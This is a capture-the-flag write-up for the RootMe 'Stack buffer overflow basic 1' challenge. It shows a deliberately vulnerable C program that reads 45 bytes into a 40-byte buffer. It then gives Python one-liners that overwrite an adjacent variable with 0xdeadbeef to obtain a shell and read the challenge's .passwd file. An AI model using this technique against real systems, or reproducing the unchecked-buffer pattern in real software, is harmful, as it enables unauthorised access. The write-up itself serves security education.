# ELF x86: Stack buffer overflow basic 1

[RootMe challenge: ELF x86 - Stack buffer overflow basic 1](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-1?lang=en): An intermediate level to familiarize yourself with stack overflows.

Environment configuration:

```text
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 
```

Given code:

```text
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

----

Apparently, the goal is to change the `check` variable to `0xdeadbeef` (Endian).

```text
app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + 'DDDD'" | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD
[check] 0x44444444

You are on the right way!
```

```text
app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
cat .passwd
```

## Resources

* [Débordement de tampon - dans la pile](https://www.root-me.org/spip.php?article807)
* [François Boisson : Buffer Overflow ou explication de "une faille de type bufferoverflow"](https://www.youtube.com/watch?v=u-OZQkv2ebw)
* [Buffering in standard streams](https://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf)
* [Stack Bug - Exploitation avancee de buffer overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Stack%20Bug%20-%20Exploitation%20avancee%20de%20buffer%20overflow.pdf)
* [Exploiting Stack Buffer Overflows in the Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf)